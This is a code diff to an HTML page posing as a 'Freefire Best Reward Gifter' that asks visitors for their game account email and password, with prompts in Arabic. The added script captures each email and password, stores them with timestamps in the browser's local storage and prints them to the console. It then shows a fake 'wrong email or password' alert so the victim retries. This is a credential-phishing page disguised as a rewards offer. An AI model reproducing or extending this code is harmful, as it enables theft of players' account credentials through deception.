@@ -5,6 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Freefire Best Reward Gifter</title>
     <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file -->
+    <script>
+        function gatherInfo() {
+            // Get the values from the input fields
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Create a log entry
+            const logEntry = {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString() // Adding a timestamp
+            };
+
+            // Retrieve existing logs from local storage
+            let logs = JSON.parse(localStorage.getItem('logs')) || [];
+
+            // Add the new log entry
+            logs.push(logEntry);
+
+            // Save the updated logs back to local storage
+            localStorage.setItem('logs', JSON.stringify(logs));
+
+            // Log the values to the console
+            console.log(`Email: ${email}, Password: ${password}`);
+            alert('البريد الإلكتروني أو كلمة المرور خاطئة!');
+
+            // Resetting the input fields
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+        }
+    </script>
 </head>
 <body>
     <header>
@@ -18,22 +49,5 @@
         <input type="text" id="password" placeholder="كلمة مرور حسابك" required>
         <button onclick="gatherInfo()">اقبل</button>
     </main>
-    <script>
-        function gatherInfo() {
-            // Get the values from the input fields
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            // Log the values to the console
-            console.log(`Email: ${email}, Password: ${password}`);
-
-            // Alert message
-            alert('xccxcxcالبريد الإلكتروني أو كلمة المرور خاطئة!');
-
-            // Resetting the input fields
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-        }
-    </script>
 </body>
 </html>
